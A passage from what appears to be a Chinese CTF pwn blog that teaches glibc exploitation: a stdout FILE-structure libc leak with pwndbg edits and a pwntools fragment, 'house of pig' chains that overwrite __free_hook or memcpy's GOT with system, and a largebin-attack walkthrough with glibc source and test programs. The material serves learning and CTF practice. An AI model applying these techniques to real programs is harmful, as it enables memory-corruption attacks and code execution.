<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2620 = 0xfbad1800</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>第四步，设置_IO_write_base低位为\x00</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2640 = 0x7ffff7dd2600</span><br><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd2600      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>再看结构体：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72542208,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br></pre></td></tr></table></figure>

<p>最终，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">����&amp;��&amp;��&amp;�&amp;��&amp;��&amp;��&amp;��&amp;����������size:  </span><br></pre></td></tr></table></figure>

<p>可以看到在size: 前面多了一些东西，若我们在gdb的debug模式下就可以看到输出的是什么了。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>可以参考largebin_attack中的starctf_2019_heap_master</p>
<p>在exp中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))<span class="comment">#这个接收 b&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))<span class="comment">#jie&#x27;sh</span></span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br></pre></td></tr></table></figure>

<p>实现了接收泄露出的<code>_IO_file_jumps</code>的libc地址，从而计算出libc_base</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title>house of pig</title>
    <url>/2025/04/15/house_of_pig/</url>
    <content><![CDATA[<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__IO_cleanup-&gt;__IO_flush_all_lockp-&gt;__IO_str_overflow</span><br><span class="line">-&gt;malloc-&gt;__memmove_avx_unaligned_erms(memcpy)-&gt;free</span><br></pre></td></tr></table></figure>

<p>通过非预期调用 <code>malloc</code>&#x2F;<code>memcpy</code>&#x2F;<code>free</code> 实现利用</p>
<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>因为利用链是 FSOP 的刷新流，所以需要触发刷新流，调用 <code>__IO_flush_all_lockp</code> 主要有三个时机：</p>
<ol>
<li><code>libc</code> 执行 <code>abort</code> 函数时（内存错误）</li>
<li>程序显式调用 <code>exit</code> 函数时</li>
<li>程序从 <code>main</code> 函数返回时</li>
</ol>
<p>现在的比赛环境，有了很多新的 IO 利用链，house of pig 借非预期地调用 <code>malloc</code>、<code>memcpy</code>、<code>free</code>，仍然有一定的应用场景。</p>
<p>除了结合题目的应用场景外，House of pig 通用性上，通常用于显式 <code>exit</code> 的情况（或者存在于 <code>main</code> 函数返回的情况），可以仅用一次 <code>largebinattack</code> 实现攻击目标。</p>
<h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>house of pig 有很大通用性优势的，有好几种分支，主要区别在于着重利用的函数。</p>
<p> **方案一：**重点在执行 free，触发 <code>IO_list_all</code></p>
<p>如果是利用 <code>fastbin reverse</code> 方法就触发 <code>IO_list_all + 0x70</code>（<code>stderr</code> 的 chain 字段）</p>
<ol>
<li>堆块上放好 payload（我们要触发的函数地址）</li>
<li>可申请到的 bin 里放置或伪造 <code>free_hook - 0x10</code>（即要修改的位置）</li>
<li>伪造 IO 结构体，触发实现申请 <code>free_hook</code>，写入 payload</li>
<li>触发 free 实现利用</li>
</ol>
<p>**方案二：**重点在执行 memcpy，构造堆用，实现 largebinattack -&gt; 触发 <code>IO_list_all</code></p>
<ol>
<li>在堆块里放置好 payload</li>
<li>修改 <code>tcache_struct</code> 的值</li>
<li>以及构造 fake IO 链 (0x410 -&gt; 0x290 -&gt; 0x128 -&gt; 0x108) 触发 <code>tcache</code> 结构体，实现申请 <code>libc.memcpy.got</code>，修改为 <code>system</code>。</li>
<li><code>delete</code> 一个 0x410 的堆</li>
</ol>
<p>方案二的延伸可以实现不用在 bin 里伪造目标地址，直接触发 <code>tcache</code> 结构体实现任意地址申请，且整个方案只需要进行一次 <code>largebinattack</code> 即可，适用于可以刷新流的任何情况。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Largebin attack</title>
    <url>/2025/03/26/largebin_attack/</url>
    <content><![CDATA[<p>文章是在初次学习largebin_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu16.04</p>
<h2 id="了解largebin"><a href="#了解largebin" class="headerlink" title="了解largebin"></a>了解largebin</h2><p>了解largebin，首先要了解largebin的结构，下面是glibc源码的一部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看出来，largebin中的chunk比其他的bins中的就够多出来了一部分就是<code>fd_nextsize</code>和<code>bk_nextsize</code></p>
<p><strong>什么样的大小才属于largebin？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<p>这是glibc中的宏定义，可以计算出：</p>
<ul>
<li>在64位程序下：MIN_LARGE_SIZE &#x3D; 64*0x10 &#x3D; 0x400;</li>
<li>在32位程序下：MIN_LARGE_SIZE &#x3D; 64*0x8 &#x3D; 0x200;</li>
</ul>
<p>大于MIN_LARGE_SIZE的chunk为large bin。</p>
<p><strong>largebin是如何管理的呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23源码1500行处</p>
<p>我们知道，fastbin有一个index，然后对应大小的bin放到对应index的bins里，largebin也类似，当一个bin被放入largebin时，首先根据size计算其对应的index，我们将0x400带入<code> 48 + (0x400 &gt;&gt; 6) = 64</code>，0x400~0x430带入largebin_index(sz)宏函数中计算后都是64，继续计算的话可以发现<strong>largebin中是在一个范围内chunk都属于同一个bin或index</strong>，因此以此类推，我们可以得到如下分布图：</p>
<p><img data-src="/../images/image-20250327153800287.png" alt="image-20250327153800287"></p>
<p><strong>我们知道了large bin是靠桶来管理不同index的chunk，不同index的chunk之间没有联系，那么在同一个index桶里，chunk之间有什么联系吗？</strong></p>
<p>Fd_nextsize指向比自己小的chunk，fd_bknextsize指向比自己大的chunk，最后一个chunk的fd_nextsize指向最后一个chunk，形成了<strong>双向链表</strong>，如下图：</p>
<p><img data-src="/../images/image-20250327161114374.png" alt="image-20250327161114374"></p>
<p><strong>假如多个一样大小的chunk怎么管理？</strong></p>
<p><img data-src="/../images/image-20250327162735558.png" alt="image-20250327162735558"></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><p>这个目的是了解<strong>同index不同大小的chunk</strong>的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);<span class="comment">//0x400</span></span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);<span class="comment">//0x410</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x420</span> - <span class="number">0x10</span>);<span class="comment">//0x420</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//这里再申请一个是触发便利unsortedbin，使对应的chunk放入largebins中</span></span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;gcc -o test1 test1.c -g</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602850 —▸ 0x602420 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602850 /* <span class="string">&#x27;P(`&#x27;</span> */</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602850      0x0000000000602000</span><br><span class="line">    					<span class="comment"># 这个指向在当前index下最大那一组的头节点	这个指向在当前index下最小那一组的头节点</span></span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68#bk</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401#chunk A</span><br><span class="line">0x602010:       0x00007ffff7dd1f68      0x0000000000602420</span><br><span class="line">0x602020:       0x0000000000602850      0x0000000000602420#fd_nextsize --&gt; chunk C prev_size</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000#bk_nextsize --&gt; chunk B prev_size</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000411#chunk B</span><br><span class="line">0x602430:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602440:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421#chunk C</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这个目的是了解<strong>同index相同大小的chun</strong>k**的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o test2 test2.c </span></span><br><span class="line"><span class="comment">//read的作用是阻塞程序执行，./test2 ,ps -a 看pid, gdb ,attach pid</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602000 —▸ 0x602840 —▸ 0x602420 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602000</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602000      0x0000000000602420</span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602010:       0x0000000000602840      0x00007ffff7dd1f68</span><br><span class="line">0x602020:       0x0000000000602000      0x0000000000602000</span><br><span class="line"><span class="comment">#在相同index下没有其它大小的chunk，指向自身</span></span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602840</span><br><span class="line">0x602840:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602850:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602860:       0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#同样大小下除了头节点，其他的fd_nextsize和bk_nextsize为0</span></span><br><span class="line">0x602870:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602430:       0x00007ffff7dd1f68      0x0000000000602840</span><br><span class="line">0x602440:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;    </span><br></pre></td></tr></table></figure>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从源码分析largebin_attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size) &#123;</span><br><span class="line">    <span class="comment">// 判断当前操作的chunk的size是不是等于largebin中最大的size</span></span><br><span class="line">    <span class="comment">/* Always insert in the second position. */</span></span><br><span class="line">    fwd = fwd-&gt;fd;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 这是largebin_attack的核心</span></span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//##//addr2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//##//addr2-&gt;fd_nextsize = victim</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk;<span class="comment">//##//addr1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//##//addr2-&gt;fd = victim</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23中3700行左右的代码，加<code>//##//</code>的是largebin_attack的核心</p>
<p>该段代码是从unsorted bin里取出未归位的large bin时可能会触发的代码。什么叫未归位？当free一个块时，如果chunk没有放到fastbin或者tcache，那么就直接放到unsorted bin里。当接下来malloc符合某些条件时，会遍历unsorted bin，并根据chunk的size把chunk给放到对应的bin里，比如放到large bin、small bin等。</p>
<p>fwd指向的是large bin的某个头结点，而victim指向的是unsorted bin里当前遍历到的这个chunk。</p>
<p>先不考虑前面的条件，假设程序执行到此处，而我们利用UAF或其他漏洞<strong>控制了fwd的bk和bk_nexsize指针分别为addr1、addr2</strong>，那么，我们代入图中计算，得：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nexsize = victim <span class="comment">//向addr2+0x18处写入victim的地址</span></span><br><span class="line">addr1-&gt;fd = victim <span class="comment">//向addr2+0x10处写入victim的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>最终实现：往任意地址处写入一个堆地址（或一个大数）</strong></p>
<p><strong>那么怎么到达这里触发这些代码呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span 